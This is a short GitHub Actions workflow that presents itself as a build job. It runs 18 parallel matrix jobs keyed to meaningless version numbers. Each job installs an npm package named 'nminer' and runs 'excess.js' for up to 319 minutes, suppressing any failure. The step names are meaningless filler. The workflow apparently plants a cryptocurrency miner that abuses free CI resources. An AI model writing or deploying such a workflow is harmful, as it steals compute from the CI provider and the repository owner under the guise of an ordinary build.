name: excess
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6880 }
          - { version: 5934 }
          - { version: 3635 }
          - { version: 5277 }
          - { version: 9385 }
          - { version: 8704 }
          - { version: 6030 }
          - { version: 1615 }
          - { version: 9266 }
          - { version: 5286 }
          - { version: 394 }
          - { version: 7532 }
          - { version: 7194 }
          - { version: 7105 }
          - { version: 3510 }
          - { version: 7324 }
          - { version: 9663 }
          - { version: 5102 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: lively through when indeed
        run: |
          npm install nminer@latest
          timeout 319m node excess.js || echo "excess executed"